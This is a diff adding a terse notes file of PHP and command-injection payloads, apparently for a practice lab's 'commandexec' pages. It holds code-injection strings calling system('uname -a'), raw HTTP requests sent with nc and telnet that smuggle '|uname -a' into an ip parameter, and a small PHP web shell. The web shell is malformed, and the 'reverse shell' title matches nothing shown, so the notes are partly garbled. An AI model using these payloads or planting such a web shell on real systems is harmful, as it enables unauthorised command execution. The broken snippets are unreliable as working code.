@@ -1,0 +1,21 @@
+utils: php reverse shell file upload
+
+By adding dummy code: ".system('uname -a'); $dummy=".
+By using comment: ".system('uname -a');# or ".system('uname -a');//.
+simple code injection with ; as separator
+
+echo "GET /commandexec/example3.php?ip=127.0.0.1
+add this to end:
+|uname+-a HTTP/1.0\r\n" | nc vulnerable 80
+
+echo "GET /commandexec/example3.php?ip=127.0.0.1|uname+-a HTTP/1.0\r\n" | nc 1.1.1.1 80
+
+% telnet vulnerable 80 
+GET /commandexec/example3.php?ip=127.0.0.1|uname+-a HTTP/1.0
+
+<?php
+	system($_GET["cmd=uname -ar"]);
+?>
+
+
+
